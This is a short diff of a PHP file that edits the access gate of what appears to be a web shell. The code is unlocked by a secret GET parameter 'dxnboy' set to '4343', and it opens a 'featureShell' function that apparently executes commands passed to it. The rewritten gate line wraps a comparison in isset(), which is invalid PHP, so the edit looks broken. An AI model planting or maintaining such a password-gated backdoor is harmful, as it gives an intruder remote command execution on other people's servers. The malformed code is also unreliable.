@@ -1,8 +1,7 @@
 <?php
 $dxnboy = "";
-$dxnboy = isset($_POST['dxnboy']) ? $_POST['dxnboy'] : '';
-$dxnboy = !empty($_POST['dxnboy']) ? $_POST['dxnboy'] : '';
-if($_GET["dxnboy"] === "4343") {
+
+if(isset($_GET["dxnboy"] === "4343")) {
 
 function featureShell($cmd, $cwd) {
     $stdout = array();
